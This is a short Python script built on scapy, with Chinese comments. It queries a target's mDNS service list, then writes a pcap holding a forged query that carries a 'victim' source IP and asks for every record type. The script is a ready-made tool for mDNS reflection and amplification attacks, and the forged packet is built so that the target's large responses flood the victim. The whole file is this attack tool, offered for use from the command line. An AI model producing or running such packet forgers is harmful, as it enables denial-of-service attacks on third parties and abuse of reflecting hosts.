from scapy.all import DNS, DNSQR, IP, UDP, Raw, wrpcap, Ether
import socket
import sys

def build_pcap_for_target(target_ip, victim_ip, output_file):
    """
    构造 mDNS 查询包并保存为 pcap 文件。

    :param target_ip: 目标 IP
    :param victim_ip: 伪造的源 IP
    :param output_file: 输出 pcap 文件路径
    :return: 0 成功, 1 失败
    """
    # 构造 mDNS 查询
    query = DNS(rd=1, qd=DNSQR(qtype="PTR", qname="_services._dns-sd._udp.local"))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2)

    try:
        # 向目标发送 mDNS 查询
        sock.sendto(bytes(query), (target_ip, 5353))
        data, _ = sock.recvfrom(8192)
    except Exception as e:
        print(f"[*] 无法从 {target_ip} 获取服务: {e}")
        return 1

    resp = DNS(data)
    dns = b""
    for i in range(resp.ancount):
        if hasattr(resp.an[i], "rdata"):
            dns += bytes(DNSQR(qtype=255, qname=resp.an[i].rdata))

    print(f"[+] 在 {target_ip} 上发现 {resp.ancount} 个服务")

    # 构造数据包
    packets = []
    ip_packet = IP(src=victim_ip, dst=target_ip)
    udp_packet = UDP(sport=12345, dport=5353)
    service = Raw(load=dns)
    req = DNS(id=0x0001, rd=1, qd=service, qdcount=resp.ancount)
    pkt = Ether() / ip_packet / udp_packet / req
    packets.append(pkt)

    # 保存为 pcap 文件
    wrpcap(output_file, packets)
    print(f"[+] 已写入 {len(packets)} 个数据包到 {output_file}")
    return 0

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("用法: python3 packet_gen.py <target_ip> <victim_ip> <output_pcap>")
        sys.exit(1)

    target_ip = sys.argv[1]
    victim_ip = sys.argv[2]
    output_file = sys.argv[3]
    sys.exit(build_pcap_for_target(target_ip, victim_ip, output_file))
